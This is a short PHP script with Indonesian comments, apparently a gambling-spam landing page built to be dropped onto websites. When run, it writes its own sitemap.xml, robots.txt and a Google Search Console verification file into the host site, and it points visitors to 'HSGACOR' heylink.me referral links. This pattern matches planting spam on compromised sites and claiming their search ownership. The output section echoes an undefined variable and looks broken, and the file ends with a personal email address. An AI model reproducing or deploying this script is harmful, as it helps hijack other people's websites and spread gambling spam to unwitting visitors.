<?php

//mengatur link web
$CANONICAL = "http://" .
$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$REFFERAL1='https://heylink.me/HSGACOR/';
$REFFERAL2='https://heylink.me/HSGACOR/';
$REFFERAL3='https://heylink.me/HSGACOR/';
$GSCHTML='xehCUO0-etJQziL4D03Zf0-s_nGPB3UMe4HyxXZ37Qc';

$TITLEPAGE='JUDULNYA';


//membuat file peta situs
if (file_exists("sitemap.xml")){
}else{
$SITEMAP = fopen('sitemap.xml', 'w');
$TEX1 = "$CANONICAL";
fwrite($SITEMAP ,$TEX1);
fclose($SITEMAP);}

// membuat file html google search console
if (file_exists("googlecfddc7c2bbf14ef5.html")){
}else{
$GOOGLE = fopen('googlecfddc7c2bbf14ef5.html', 'w');
$TEX2 = "google-site-verification: googlecfddc7c2bbf14ef5.html";
fwrite($GOOGLE ,$TEX2);
fclose($GOOGLE);}

//membuat file robots.txt
if (file_exists("robots.txt")){
}else{
$ROBOTS = fopen('robots.txt', 'w');
$TEX3 = "User-agent: *
Allow: /
Sitemap: $CANONICAL";
fwrite($ROBOTS ,$TEX3);
fclose($ROBOTS);}

//require("main.php");
?>


<?php echo $GSC ?>
<?php echo $TITLEPAGE ?>
<?php echo $CANONICAL ?>
<?php echo $REFFERAL1 ?>
<?php echo $TITLEPAGE ?>
karenlaurence43@gmail.com
